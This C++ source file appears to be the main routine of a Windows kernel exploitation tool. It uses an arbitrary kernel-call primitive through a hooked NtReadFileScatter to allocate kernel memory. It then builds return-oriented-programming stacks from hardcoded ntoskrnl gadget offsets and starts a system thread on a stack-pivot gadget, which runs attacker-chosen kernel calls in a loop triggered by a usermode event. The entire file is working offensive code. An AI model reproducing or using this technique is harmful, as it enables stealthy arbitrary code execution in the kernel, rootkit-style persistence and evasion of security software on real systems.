#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>
#include <include/stack/stack_manager.hpp>
#include <include/globals.hpp>

#ifdef _MSC_VER
#pragma pack(push, 1)
#endif
struct PivotData
{
    uint8_t Padding1[0x10];
    void* NewRsp;           // Offset 0x10: New stack pointer
    void* NewRbp;           // Offset 0x18: New base pointer
    uint8_t Padding2[0x30];
    void* JumpAddress;      // Offset 0x50: Jump target (rdx)
};
#if defined(__GNUC__) || defined(__clang__)
__attribute__((packed))
#endif
;
#ifdef _MSC_VER
#pragma pack(pop)
#endif

static_assert(offsetof(PivotData, NewRsp) == 0x10, "NewRsp offset must be 0x10");
static_assert(offsetof(PivotData, NewRbp) == 0x18, "NewRbp offset must be 0x18");
static_assert(offsetof(PivotData, JumpAddress) == 0x50, "JumpAddress offset must be 0x50");
static_assert(sizeof(PivotData) == 0x58, "PivotData size must be 0x58");

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    const std::uintptr_t RandomValidThreadAddress = Utils::FindRandomValidThreadAddress();
    if (!RandomValidThreadAddress)
    {
        std::exception("Failed to find a random valid thread address");
        return EXIT_FAILURE;
    }

    Globals::WindowsBuild = Utils::GetWindowsDisplayVersion();
    if (Globals::WindowsBuild.empty())
    {
        std::exception("Failed to find the windows build being used");
        return EXIT_FAILURE;
    }

    Globals::KernelBase = Driver::GetKernelModuleBase();
    if (!Globals::KernelBase)
    {
        std::exception("Failed to find ntoskrnl.exe base");
        return EXIT_FAILURE;
    }

    std::printf("[+] Windows build: %s\n", Globals::WindowsBuild.c_str());
    std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
    std::printf("[+] ntoskrnl.exe @ 0x%p\n", Globals::KernelBase);

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller("NtReadFileScatter");

    void* PivotDataAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(PivotData), reinterpret_cast<void*>(MAXULONG64));
    void* DestinationStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
    void* SourceStringArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x20, reinterpret_cast<void*>(MAXULONG64));
    void* ObjectAttributeArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", sizeof(OBJECT_ATTRIBUTES), reinterpret_cast<void*>(MAXULONG64));
    void* OutputHandleArg = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    void* MainStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
    void* InitStackAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x6000, reinterpret_cast<void*>(MAXULONG64));
    Globals::DummyMemoryAllocation = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    Globals::CurrentStackOffsetAddress = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));
    Globals::StackLimitStoreAddress = KernelCaller.Call<void*, std::size_t, void*>("MmAllocateContiguousMemory", 0x8, reinterpret_cast<void*>(MAXULONG64));

    std::printf("[+] Main Stack @ 0x%p\n", MainStackAllocation);
    std::printf("[+] Init Stack @ 0x%p\n", InitStackAllocation);
    std::printf("[+] Current Stack Offset @ 0x%p\n", Globals::CurrentStackOffsetAddress);

    if (!MainStackAllocation || !InitStackAllocation || !PivotDataAllocation || !Globals::CurrentStackOffsetAddress || !Globals::StackLimitStoreAddress)
        return EXIT_FAILURE;

    // Zero out stack allocation
    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", MainStackAllocation, 0x6000);
    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", InitStackAllocation, 0x6000);
    KernelCaller.Call<void*, void*, std::size_t>("RtlZeroMemory", Globals::CurrentStackOffsetAddress, 0x8);

    // Create usermode event
    const wchar_t* EventNameString = L"\\BaseNamedObjects\\Global\\MYSIGNALEVENT";
    HANDLE UmEvent = CreateEventW(NULL, FALSE, FALSE, L"Global\\MYSIGNALEVENT");
    std::printf("[+] Usermode event handle: %x\n", UmEvent);

    StackManager MainStackManager(Globals::KernelBase, (std::uintptr_t)MainStackAllocation + 0x2000, 0x2000);
    StackManager InitStackManager(Globals::KernelBase, (std::uintptr_t)InitStackAllocation + 0x2000, 0x2000);

    // Open handle to usermode event in the kernel
    InitStackManager.AddFunctionCall("RtlInitUnicodeString", (std::uint64_t)DestinationStringArg, (std::uint64_t)SourceStringArg);
    InitStackManager.AddFunctionCall("ZwOpenEvent", (std::uint64_t)OutputHandleArg, EVENT_MODIFY_STATE | SYNCHRONIZE, (std::uint64_t)ObjectAttributeArg);
    InitStackManager.PivotToNewStack(MainStackManager);

    // set first arg
    MainStackManager.ReadIntoRcx((std::uint64_t)OutputHandleArg);
    // set second arg
    MainStackManager.SetRdx(TRUE);
    // set third arg
    MainStackManager.SetR8(NULL);

    MainStackManager.AddFunctionCall("ZwWaitForSingleObject");
    MainStackManager.LoopBack();

    OBJECT_ATTRIBUTES ObjectAttributesData;
    InitializeObjectAttributes(&ObjectAttributesData, (UNICODE_STRING*)DestinationStringArg, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    std::uint64_t CurrentStackOffsetStartValue = 0x2000;

    void* RetGadgetAddress = reinterpret_cast<void*>(Globals::KernelBase + 0x20043b);
    void* NewRspAddress = reinterpret_cast<void*>(reinterpret_cast<std::uint64_t>(InitStackAllocation) + 0x2000);

    PivotData BootstrapPivotData = {};
    // Set RSP to the allocation of the first stack we will be execution, the 'initialization' stack.
    BootstrapPivotData.NewRsp = NewRspAddress;
    // RBP can be whatever, it's value doesn't seem to be affecting anything of importance to us.
    BootstrapPivotData.NewRbp = NULL;
    // Address we will be jumping to once the bootstrap gadget is done
    // executing. We will just 'ret;' into the first gadget in our new stack.
    BootstrapPivotData.JumpAddress = RetGadgetAddress;

    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", PivotDataAllocation, &BootstrapPivotData, sizeof(PivotData));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", SourceStringArg, (void*)EventNameString, (lstrlenW(EventNameString) + 1) * sizeof(WCHAR));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", ObjectAttributeArg, &ObjectAttributesData, sizeof(OBJECT_ATTRIBUTES));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", Globals::CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", (void*)((std::uintptr_t)MainStackAllocation + 0x2000), MainStackManager.GetStackBuffer(), MainStackManager.GetStackSize());
    KernelCaller.Call<void*, void*, void*, std::size_t>("memcpy", (void*)((std::uintptr_t)InitStackAllocation + 0x2000), InitStackManager.GetStackBuffer(), InitStackManager.GetStackSize());

    Sleep(500);
    std::cin.get();

    // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
    void* BootstrapGadget = (void*)(Globals::KernelBase + 0x698bd0);

    HANDLE KernelThreadHandle;
    NTSTATUS ThreadCreationStatus = KernelCaller.Call<NTSTATUS, HANDLE*, ULONG, OBJECT_ATTRIBUTES*, HANDLE, void*, void*, void*>(
        "PsCreateSystemThread",
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        BootstrapGadget,
        PivotDataAllocation
    );

    if (!NT_SUCCESS(ThreadCreationStatus))
    {
        std::printf("[-] PsCreateSystemThread failed with status: 0x%X\n", ThreadCreationStatus);
        return EXIT_FAILURE;
    }

    KernelCaller.Call<void*, HANDLE>("ZwClose", KernelThreadHandle);

    return EXIT_SUCCESS;
}